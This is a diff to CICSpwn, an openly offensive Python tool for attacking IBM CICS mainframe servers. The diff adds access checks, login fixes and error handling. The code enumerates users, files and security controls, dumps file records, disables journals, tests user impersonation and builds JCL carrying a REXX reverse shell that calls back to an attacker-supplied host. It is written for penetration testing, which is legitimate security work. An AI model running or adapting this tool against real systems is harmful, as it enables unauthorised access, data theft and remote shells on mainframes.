@@ -1,3 +1,4 @@
+#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
 import py3270
@@ -15,7 +16,7 @@ import signal
 import argparse 
 
 ####################################################################################
-#			              *******  CICSpwn  ********                             
+#                   *******  CICSpwn  ********                             
 ####################################################################################
 #
 # CICSpwn is a tool to pentest CICS servers by abusing IBM Supplied transactions 
@@ -26,11 +27,11 @@ import argparse
 #        SPOOL=YES in SIT table
 #        or TDQueue pointing to INTRDR (which was defined in CICS start up JCL)
 #                                                                       
-# Created by: Ayoul3 (@ayoul3__              	
+# Created by: Ayoul3 (@ayoul3__               
 # Credit for the reverse shell goes to @mainframed767 (https://github.com/mainframed)
-# Copyright GPL 2016                                             	  
+# Copyright GPL 2016                                                
 #####################################################################################
-
+class AuthorizationError(Exception): pass
 TRAN_NUMBER = 1000
 SLEEP = 0.5
 AUTHENTICATED = False
@@ -79,17 +80,17 @@ def show_screen():
         print d
         
 def whine(text, kind='clear', level=0):
-	typdisp = ''
-	lvldisp = ''
-	color =''
-	if kind == 'warn': typdisp = '[!] ';color=bcolors.YELLOW
-	elif kind == 'info': typdisp = '[+] ';color=bcolors.WHITE
-	elif kind == 'err': typdisp = '[#] ';color=bcolors.RED
-	elif kind == 'good': typdisp = '[*] ';color=bcolors.GREEN
-	if level == 1: lvldisp = "\t"
-	elif level == 2: lvldisp = "\t\t"
-	elif level == 3: lvldisp = "\t\t\t"
-	print color+lvldisp+typdisp+text+ (bcolors.ENDC if color!="" else "");
+  typdisp = ''
+  lvldisp = ''
+  color =''
+  if kind == 'warn': typdisp = '[!] ';color=bcolors.YELLOW
+  elif kind == 'info': typdisp = '[+] ';color=bcolors.WHITE
+  elif kind == 'err': typdisp = '[#] ';color=bcolors.RED
+  elif kind == 'good': typdisp = '[*] ';color=bcolors.GREEN
+  if level == 1: lvldisp = "\t"
+  elif level == 2: lvldisp = "\t\t"
+  elif level == 3: lvldisp = "\t\t\t"
+  print color+lvldisp+typdisp+text+ (bcolors.ENDC if color!="" else "");
 
 def connect_zOS(em, target):
     whine('Connecting to target '+target,kind='info')
@@ -108,24 +109,45 @@ def do_authenticate(userid, password, pos_pass):
        #~ em.safe_send("CESN                                           ");
        #~ em.send_enter();
        #~ sleep()   
+   #### FFFFF ######
+   #### em.get_pos() returns a 0 based offfset?
+   ####
+# (Pdb) em.get_pos()
+# (4, 4)
+# (Pdb) em.move_to(*em.get_pos())
+# (Pdb) em.get_pos()
+# (3, 3)
+# move_to is 0 based and get_pos is 0 based ubut the efing move_to removes -1 from args
+# 
+# YAy!!! AAARGH HORRROR
+####
+
    posx, posy = em.get_pos()
-      
+   
+   # em.move_to(posx+1,posy+1)
    em.safe_send(results.userid)   
          
-   em.move_to(pos_pass,posy+1)
+   
+   #em.move_to(pos_pass,posy+1)
+   pwd_y_pos=em.find_field_start_on_row(pos_pass)
+   em.move_to(pos_pass,pwd_y_pos)
    em.safe_send(results.password)
    em.send_enter();
    
    data = em.screen_get();
+
    if any("Your userid is invalid" in s for s in data):
       whine('Incorrect userid information','err')
       sys.exit();
    elif any("Your password is invalid" in s for s in data):
       whine('Incorrect password information','err')
       sys.exit();
+   elif any("Sign on failure" in s for s in data):
+      whine('Invalid credentials','err')
+      sys.exit();
     
              
-def check_valid_applid(applid, do_authent, method = 1):
+def check_valid_applid(applid, do_authent, method = 1,custom_cics=False):
     em.send_string(applid) #CICS APPLID in VTAM
     em.send_enter()   
     sleep()
@@ -134,31 +156,38 @@ def check_valid_applid(applid, do_authent, method = 1):
         pos_pass=1;
         data = em.screen_get()   
         for d in data:
-            print "eeed"
+#            print "eeed"
             if "Password" in d or "Code" in d:
                 break;
             else:
                pos_pass +=1
         do_authenticate(results.userid, results.password, pos_pass)
     
-    if method ==1:
+    if custom_cics:
+      em.safe_send(custom_cics)
+      em.send_enter()
       em.send_clear()
-      
-    if method ==3:
+      em.safe_send("garbage")
+      em.send_enter()
+    else:  
+      if method ==1:
+        em.send_clear()
+        
+      if method ==3:
+        em.send_pf3()
+        sleep()
+        em.send_clear()
+              
+      if method ==2:
+        em.send_clear()
+        sleep()
+        em.send_clear()    
+        
+      em.move_to(1,1)  
+      #em.send_string('CESF') #CICS CESF is the Signoff command
       em.send_pf3()
-      sleep()
-      em.send_clear()
-            
-    if method ==2:
-      em.send_clear()
-      sleep()
-      em.send_clear()    
-      
-    em.move_to(1,1)  
-    #em.send_string('CESF') #CICS CESF is the Signoff command
-    em.send_pf3()
-    em.send_enter()
-    sleep();
+      em.send_enter()
+      sleep();
     
     if em.find_response( 'DFHAC2001'):
         whine('Access to CICS Terminal is possible with APPID '+applid,'good')
@@ -169,7 +198,7 @@ def check_valid_applid(applid, do_authent, method = 1):
     else:
         method += 1
         whine('Returning to CICS terminal via method '+str(method),kind='info')
-        return check_valid_applid(applid, do_authent, method)
+        return check_valid_applid(applid, do_authent, method,custom_cics=custom_cics)
 
 def query_cics(request, verify, line):
     em.move_to(1,2);
@@ -291,8 +320,14 @@ def get_hql_libraries():
     
     em.send_pf3()
     return None
+
 def get_users():
+    #FIXME: You can have screens of tasks and there isn't anything that tells
+    #     you that you need to scroll down
+    #     in future one should add a pf11 scroll down thing and 
+    #     compare screens
     out = []
+    em.send_clear() # for good luck!
     em.move_to(1,2);
     request = "CEMT I TASK"
     em.safe_send(request+'                                              ');
@@ -305,45 +340,59 @@ def get_users():
            out.append(d[pos:pos+8].strip())
     
     em.send_pf3()
+    #deduplicate users
+    out=list(set(out))
     return out
 
 def get_version():
    version = query_cics_scrap("CEMT I SYS", "Cicstslevel(", 8, 0, 0 )
    version = version.strip("0").replace("0",".")
    return version     
-   
+
+def check_transaction_access(tx,param,mode=5):
+     access=None
+     query_cics(tx,param,mode)
+     if em.find_response("DFHAC2002"):
+      access=False
+     else:
+      access=True
+      em.send_pf3()
+
 def get_infos():
-    cemt = True
-    ceci = True
+    cemt = True # assumption
+    ceci = False
     cecs = False
-    ceda = True
-    cedf = True
+    ceda = False
+    cedf = False
     cebr = False
     userid = ''
     hlq_files = None
     hlq_libraries = None
     version = None
         
-    version = get_version();
-    whine("CICS TS Version "+version, 'good',1);
-    #~ if query_cics('CEMT','Inquire',5):
+    
+    if check_transaction_access("CEMT", "I"):
+      cemt = True
+      # if CMET is not available we can't get version either
+      version = get_version();
+      whine("CICS TS Version "+version, 'good',1);
       #~ cemt = True
       #~ em.send_pf3();
-    #~ if query_cics('CEDA','ALter',5):
-      #~ ceda = True
-      #~ em.send_pf3();        
-    #~ if query_cics('CECI','ACquire',5):
-        #~ ceci = True
-        #~ em.send_pf3();
-    #~ if query_cics('CECS','ACquire',5):
-        #~ ceci = True
-        #~ em.send_pf3();
-    #~ if query_cics('CEDF ,OFF','EDF MODE OFF',1):
-        #~ cedf = True
-        #~ em.send_pf3();
-    #~ if query_cics('CEBR','ENTER COMMAND',2):
-        #~ cebr = True
-        #~ em.send_pf3();
+    if check_transaction_access("CEDA","ALTER"):
+      ceda=True
+      
+    if check_transaction_access('CECI','ACquire'):
+      ceci = True
+
+    if check_transaction_access('CECS','ACquire'):
+      cecs=True
+
+    if check_transaction_access('CEDF ,OFF','EDF MODE OFF',1):
+        cedf = True
+      
+    if check_transaction_access('CEBR','ENTER COMMAND',2):
+        cebr = True
+      
         
     em.send_clear()
     whine("Available IBM supplied transactions: ", 'info');
@@ -352,73 +401,80 @@ def get_infos():
     if ceda: whine("CEDA", 'good',1);
     if cedf: whine("CEDF", 'good',1);
     if cebr: whine("CEBR", 'good',1);
-    if not ceci:
-        whine("Little information will be available on the system", 'err');
-        
-    
-    whine("General system information: ", 'info');
-    variables = ["USERID", "SYSID","NET","NATl"]
-    values = get_cics_value('CECI ASSIGN', variables, True)        
-    userid = values[0]; sysid = values[1]; netname = values[2]; language = values[3]
-       
-    
-    whine("Userid: "+userid,'good',1);
-    whine("Sysid: "+sysid,'good',1);
-    whine("LU session name: "+netname,'good',1);
-    whine("language: "+language,'good',1);
-    
-    hlq_files = get_hql_files();
-    hlq_libraries = get_hql_libraries();
-    
-    if hlq_files:
-       whine("Files HLQ:\t"+hlq_files,'good',1)
-    if hlq_libraries:
-       whine("Library path:\t"+hlq_libraries,'good',1)
-    
-    whine("Active users", 'info');
-    users = get_users();
-    if users:
-       for u in users:
-           whine(u, 'good', 1)
-    else:
-        whine('No active user', 'info',1)
-        
-    whine("JCL Submission", 'info');
-    spool = send_cics('CECI SpoolOpen OUTPUT USERID(INTRDR  ) NODE(LOCAL   )',True)
-    em.send_pf3();
-    if cemt:
+
+    if ceci:
+      whine("General system information: ", 'info');
+      variables = ["USERID", "SYSID","NET","NATl"]
+      values = get_cics_value('CECI ASSIGN', variables, True)        
+      userid = values[0]; sysid = values[1]; netname = values[2]; language = values[3]
+         
+      
+      whine("Userid: "+userid,'good',1);
+      whine("Sysid: "+sysid,'good',1);
+      whine("LU session name: "+netname,'good',1);
+      whine("language: "+language,'good',1);
+
+      whine("JCL Submission", 'info');
+      spool = send_cics('CECI SpoolOpen OUTPUT USERID(INTRDR  ) NODE(LOCAL   )',True)
+      em.send_pf3();
+
+      if cemt:
         tdqueue = query_cics_scrap('CEMT INQUIRE TDQueue DDN (INREADER)', 'Tdq(', 4, 0, 0)
         tdqueue2 = query_cics_scrap('CEMT INQUIRE TDQueue DDN (INTRDR)', 'Tdq(', 4, 0, 0)
         
         em.send_pf3();    
     
-    if spool and ceci:
-        whine('Access to the internal spool is apparently available','good',1);
-                
-    if (tdqueue !="*" or tdqueue2 !="*") and ceci:
-        whine('Transiant queue to access spool is apparently available','good',1);
-        whine('When submitting a job with TDQueue, provide the option --queue='+(tdqueue.strip('\n') if tdqueue else tdqueue2.strip('\n')),'good',2);
-       
+      if spool:
+          whine('Access to the internal spool is apparently available','good',1);
+                  
+      if (tdqueue !="*" or tdqueue2 !="*"):
+          whine('Transiant queue to access spool is apparently available','good',1);
+          whine('When submitting a job with TDQueue, provide the option --queue='+(tdqueue.strip('\n') if tdqueue else tdqueue2.strip('\n')),'good',2);
+         
+            
+      if spool == False and tdqueue ==False:
+          whine('No way to submit JCL through this CICS region','err',1);
+      
+      whine("Access control", 'info');
           
-    if spool == False and tdqueue ==False:
-        whine('No way to submit JCL through this CICS region','err',1);
-    
-    whine("Access control", 'info');
-        
-    variables = ["READ"]
-    read = get_cics_value('CECI QUERY SECURITY RESC(FACILITY) RESID(XXX) RESIDL(3) ', variables, True)
-    read = ''.join(read)
-    if read == "+0000000035":
-        whine('CICS does not use RACF/ACF2/TopSecret. Every user has as much access as the CICS region ID','good',1);
-        sys.exit();
-        
-    variables = ["READ"]
-    read = get_cics_value('CECI QUERY SECURITY RESC(TSOAUTH) RESID(JCL) RESIDL(3) ', variables, True)
-    read = ''.join(read)
-    if read == "+0000000035":
-        whine('User '+userid+' authorized to submit JOBS','good',1);
+      variables = ["READ"]
+      read = get_cics_value('CECI QUERY SECURITY RESC(FACILITY) RESID(XXX) RESIDL(3) ', variables, True)
+      read = ''.join(read)
+      if read == "+0000000035":
+          whine('CICS does not use RACF/ACF2/TopSecret. Every user has as much access as the CICS region ID','good',1);
+          sys.exit();
+          
+      variables = ["READ"]
+      read = get_cics_value('CECI QUERY SECURITY RESC(TSOAUTH) RESID(JCL) RESIDL(3) ', variables, True)
+      read = ''.join(read)
+      if read == "+0000000035":
+          whine('User '+userid+' authorized to submit JOBS','good',1);
+      else:
+          whine('User '+userid+' not authorized to submit JOBS','err',1);
+
     else:
-        whine('User '+userid+' not authorized to submit JOBS','err',1);
+      whine("CECI not available. Little information will be available on the system", 'err');
+
+    ### THESE just require CEMT
+    if cemt:
+      hlq_files = get_hql_files();
+      hlq_libraries = get_hql_libraries();
+      
+      if hlq_files:
+         whine("Files HLQ:\t"+hlq_files,'good',1)
+      if hlq_libraries:
+         whine("Library path:\t"+hlq_libraries,'good',1)
+      
+      whine("Active users", 'info');
+      users = get_users();
+      if users:
+         for u in users:
+             whine(u, 'good', 1)
+      else:
+          whine('No active user', 'info',1)
+        
+    
+    
     
     # add check for OMVS, SUPERUSER, SERVER, DAMON, etc.
     
@@ -503,8 +559,17 @@ def get_files(filename):
 def fetch_content(filename, ridfld, keylength):
     em.move_to(1,2);
     request = 'CECI READ FI('+filename.upper()+') RI('+str(ridfld)+') GTE INTO(&FI)'
-    em.safe_send(request)
+    em.safe_send(request)    
     em.send_enter()
+    if em.find_response("DFHAC2002"):
+      # find the line
+      screen=em.screen_get()
+      for i,l in enumerate(screen):
+        if "DFHAC2002" in l:
+          errmsg=l.strip()+" " +screen[i+1].strip()
+          whine('You are not auhtorised to execute the CECI transaction (probably): {}'.format(errmsg),"err")
+          raise AuthorizationError()
+
     em.send_enter() # Send twice Enter to confirm transaction
     
     data = em.screen_get();
@@ -533,7 +598,17 @@ def fetch_content(filename, ridfld, keylength):
     print out
     
     return out[0:keylength]
-    
+
+def parse_cemt_i_scren(data):
+    values={}
+    for row in data:
+      m=re.search("^[\s+]+(?P<key>[A-Z]\w+)\(\s*(?P<value>[^)]*)\s*\)\s*$",row)
+      if m:
+        d=m.groupdict()
+        values[d['key']]=d['value']
+    return values
+
+
 def get_file_content():
     file_enabled, file_readable, file_opened = False, False, False;
     keylength, recordsize = 0, 0
@@ -568,6 +643,9 @@ def get_file_content():
         data = em.screen_get();
         if "NORMAL" in data[2]:
             whine("File "+results.filename+" is enabled, open, and readable", 'good')
+        elif "NOT AUTHORIZED" in data[2]:
+            whine("Unable to open the file {} for reading".format(results.filename),"err")
+            return
     
     # getting key length and record size. Can only do when then the file is enabled and opened
     em.move_to(1,2);
@@ -582,16 +660,21 @@ def get_file_content():
     em.send_pf11();
     
     data = em.screen_get();
-    for d in data:
-        pos1 = d.find("Keylength( ")
-        pos2 = d.find("Recordsize( ")
-        if pos1 > -1:
-            pos1 = pos1 + len("Keylength( ")
-            keylength = int(d[pos1:pos1+3])
-        if pos2 > -1:
-            pos2 = pos2 + len("Recordsize( ")
-            recordsize = int(d[pos2:pos2+5])
-        
+    values=parse_cemt_i_scren(data)
+
+    # for d in data:
+    #     pos1 = d.find("Keylength( ")
+    #     pos2 = d.find("Recordsize( ")
+    #     if pos1 > -1:
+    #         pos1 = pos1 + len("Keylength( ")
+    #         keylength = int(d[pos1:pos1+3])
+    #     if pos2 > -1:
+    #         pos2 = pos2 + len("Recordsize( ")
+    #         recordsize = int(d[pos2:pos2+5])
+
+    # If one of them is good (e.g. Recordsize=2000 but other is not, why can't we the valid one)
+    keylength=int(values['Keylength'])
+    recordsize=int(values['Recordsize'])    
     if keylength != 0 and recordsize !=0:
         whine("Record size: "+str(recordsize)+"\tkeylength:"+str(keylength), 'good')
     else:
@@ -603,15 +686,17 @@ def get_file_content():
     em.send_pf3()
     
     next_ridfld = 0;
-    
-    while int(next_ridfld) != -1:
-       ridfld = next_ridfld
-       next_ridfld = fetch_content(filename, ridfld, keylength)
-       next_ridfld = format(int(next_ridfld)+1, "0"+str(keylength))
+    try:
+      while int(next_ridfld) != -1:
+         ridfld = next_ridfld
+         next_ridfld = fetch_content(filename, ridfld, keylength)
+         next_ridfld = format(int(next_ridfld)+1, "0"+str(keylength))
+    except AuthorizationError:
+      return
          
 
 def rand_name(size=8, chars=string.ascii_letters):
-	return ''.join(random.choice(chars) for x in range( 1, size ))
+  return ''.join(random.choice(chars) for x in range( 1, size ))
 
 def dummy_jcl(lhost):
     
@@ -632,13 +717,13 @@ def dummy_jcl(lhost):
     return dummy_jcl    
     
 def reverse_jcl(lhost, username="CICSUSER"):
-	
-	job_name = username
-	rexx_file = rand_name(randrange(3,6))
-	source_file = rand_name(randrange(3,6))
-	exec_file = rand_name(randrange(3,6))
+  
+  job_name = username
+  rexx_file = rand_name(randrange(3,6))
+  source_file = rand_name(randrange(3,6))
+  exec_file = rand_name(randrange(3,6))
 
-	jcl_code = "//"+job_name.upper()+" JOB ("+"123456768"+"""),CLASS=A
+  jcl_code = "//"+job_name.upper()+" JOB ("+"123456768"+"""),CLASS=A
 //*
 //EXIST2  EXEC PGM=IDCAMS
 //SYSPRINT DD  SYSOUT=*
@@ -713,7 +798,7 @@ if sock = word(socklist,i) then return 1;end;return 0
 /*
 //SYSIN    DD  DUMMY
 /*EOF"""
-	return jcl_code
+  return jcl_code
 
 def set_mixedCase(em):
     whine('Setting the current terminal to mixed case',kind='info')
@@ -1007,111 +1092,111 @@ def check_surrogat(surrogat_user):
 def main(results):
     global DO_AUTHENT
     global AUTHENTICATED
+    try:
+      if (results.submit and (results.lhost == None or len(results.lhost.split(":")) < 2) and not results.jcl):
+          whine('You must specify a connect back address with the option --lhost <LHOST:PORT> ','err')
+          sys.exit();      
 
-    if (results.submit and (results.lhost == None or len(results.lhost.split(":")) < 2) and not results.jcl):
-        whine('You must specify a connect back address with the option --lhost <LHOST:PORT> ','err')
-        sys.exit();      
-
-    if (results.userid != None and results.password !=None):
-       
-       DO_AUTHENT = True
-       data = em.screen_get()   
-       pos_pass=1;
-       logon_screen=False
-       
-       for d in data:
-         if "Password" in d or "Code" in d:
-           logon_screen=True
-           break
-         else:
-           pos_pass +=1
-       if logon_screen:
-           do_authenticate(results.userid, results.password, pos_pass)
-           whine("Successful authentication", 'info')
-           AUTHENTICATED = True;
-
-    # Checking if APPLID provided is valid
-    if not check_valid_applid(results.applid, DO_AUTHENT):
-        whine("Applid "+results.applid+" not valid, try again maybe it's a network lag", "err")
-        sys.exit();
-
-    if results.info:
-        whine("Getting information about CICS server (APPLID: "+results.applid+")", 'info')
-        get_infos();
-
-    elif results.trans:
-        if len(results.pattern) > 4:
-           whine('Transaction ID cannot be over 4 characters, ID will be truncated','err')
-        if len(results.pattern) < 4 and "*" not in results.pattern:
-           results.pattern +="****"
+      if (results.userid != None and results.password !=None):
          
-        transid = results.pattern[:4]
-        whine("Getting all transactions that match "+transid, 'info')
-        get_transactions(transid);
-        
-    elif results.files:
-        if len(results.pattern) > 8:
-            whine('Filename cannot be over 8 characters, Name will be truncated','err')
-        if len(results.pattern) < 8 and "*" not in results.pattern:
-           results.pattern +="********"
+         DO_AUTHENT = True
+         data = em.screen_get()   
+         pos_pass=1;
+         logon_screen=False
          
-        filename = results.pattern[:8]    
-        
-        whine("Getting all files that match "+filename, 'info')
-        get_files(filename);
-        
-    elif results.filename:
-        whine("Getting Attributes of file "+results.filename, 'info')
-        get_file_content();
+         for d in data:
+           if "Password" in d or "Code" in d:
+             logon_screen=True
+             break
+           else:
+             pos_pass +=1
+         if logon_screen:
+             do_authenticate(results.userid, results.password, pos_pass)
+             whine("Successful authentication", 'info')
+             AUTHENTICATED = True;
 
-    elif results.ena_trans:
-        whine("Activating the transaction "+results.ena_trans, 'info')
-        if len(results.ena_trans) != 4:
-            whine("Transaction ID has to be 4 characters long "+results.ena_trans, 'err')
-            sys.exit();
-            
-        activate_transaction(results.ena_trans);
-        
-    elif results.submit:
-        submit_job(results.submit,results.lhost);
+      # Checking if APPLID provided is valid
+      if not check_valid_applid(results.applid, DO_AUTHENT,custom_cics=results.custom_cics):
+          whine("Applid "+results.applid+" not valid, try again maybe it's a network lag", "err")
+          sys.exit();
 
-    elif results.journal:
-        whine("Disabling journal before moving on", 'info')
-        disable_journal();
+      if results.info:
+          whine("Getting information about CICS server (APPLID: "+results.applid+")", 'info')
+          get_infos();
 
-    elif results.userids:
-        whine("Scraping userids from different menus", 'info')
-        fetch_userids();
-        
-    elif results.surrogat_user:
-        whine("Checking whether you can impersonate Userid "+results.surrogat_user, 'info')
-        check_surrogat(results.surrogat_user)
-    
-    em.terminate()
+      elif results.trans:
+          if len(results.pattern) > 4:
+             whine('Transaction ID cannot be over 4 characters, ID will be truncated','err')
+          if len(results.pattern) < 4 and "*" not in results.pattern:
+             results.pattern +="****"
+           
+          transid = results.pattern[:4]
+          whine("Getting all transactions that match "+transid, 'info')
+          get_transactions(transid);
+          
+      elif results.files:
+          if len(results.pattern) > 8:
+              whine('Filename cannot be over 8 characters, Name will be truncated','err')
+          if len(results.pattern) < 8 and "*" not in results.pattern:
+             results.pattern +="********"
+           
+          filename = results.pattern[:8]    
+          
+          whine("Getting all files that match "+filename, 'info')
+          get_files(filename);
+          
+      elif results.filename:
+          whine("Getting Attributes of file "+results.filename, 'info')
+          get_file_content();
+
+      elif results.ena_trans:
+          whine("Activating the transaction "+results.ena_trans, 'info')
+          if len(results.ena_trans) != 4:
+              whine("Transaction ID has to be 4 characters long "+results.ena_trans, 'err')
+              sys.exit();
+              
+          activate_transaction(results.ena_trans);
+          
+      elif results.submit:
+          submit_job(results.submit,results.lhost);
+
+      elif results.journal:
+          whine("Disabling journal before moving on", 'info')
+          disable_journal();
+
+      elif results.userids:
+          whine("Scraping userids from different menus", 'info')
+          fetch_userids();
+          
+      elif results.surrogat_user:
+          whine("Checking whether you can impersonate Userid "+results.surrogat_user, 'info')
+          check_surrogat(results.surrogat_user)
+    finally:
+      em.terminate()
     
 # not used
 def check_VTAM(em):
-	whine('Checking ifactivate in VTAM',kind='info')
-	#Test command enabled in the session-level USS table ISTINCDT, should always work
-	em.send_string('IBMTEST')
-	em.send_enter()
-	#sleep()
-	if not em.find_response( 'IBMECHO ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'):
-		for i in xrange(1,5):
-			time.sleep(0.3+(i/10))
-			if em.find_response( 'IBMECHO ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'):
-				whine('The host is slow, increasing delay by 0.1s to: 0.3s',kind='warn')
-			else:
-				em.send_string('IBMTEST')
-				em.send_enter()
-		whine('Mainframe not in VTAM, aborting',kind='err')
-		#check_CICS(em) #All may not be lost
-		return False
-	elif em.find_response( 'REQSESS error'):
-		whine('Mainframe may be in a weird VTAM, continuing reluctantly',kind='warn')
-	else:
-		whine('VTAM interface detected',kind='info')
-        return True
+  whine('Checking ifactivate in VTAM',kind='info')
+  #Test command enabled in the session-level USS table ISTINCDT, should always work
+  em.send_string('IBMTEST')
+  em.send_enter()
+  #sleep()
+  if not em.find_response( 'IBMECHO ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'):
+    for i in xrange(1,5):
+      time.sleep(0.3+(i/10))
+      if em.find_response( 'IBMECHO ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'):
+        whine('The host is slow, increasing delay by 0.1s to: 0.3s',kind='warn')
+      else:
+        em.send_string('IBMTEST')
+        em.send_enter()
+    whine('Mainframe not in VTAM, aborting',kind='err')
+    #check_CICS(em) #All may not be lost
+    return False
+  elif em.find_response( 'REQSESS error'):
+    whine('Mainframe may be in a weird VTAM, continuing reluctantly',kind='warn')
+  else:
+    whine('VTAM interface detected',kind='info')
+    return True
 
 
 if __name__ == "__main__" :
@@ -1139,6 +1224,7 @@ if __name__ == "__main__" :
 
     parser.add_argument('-l','--lhost',help='Remote server to call back to for reverse shell (host:port)',dest='lhost')
     parser.add_argument('-j','--jcl',help='Custom JCL file to provide',dest='jcl')
+    parser.add_argument('--custom-exit-to-cics',help='String to type to get an exit to CICS',dest='custom_cics',default=False)
 
     results = parser.parse_args()
     
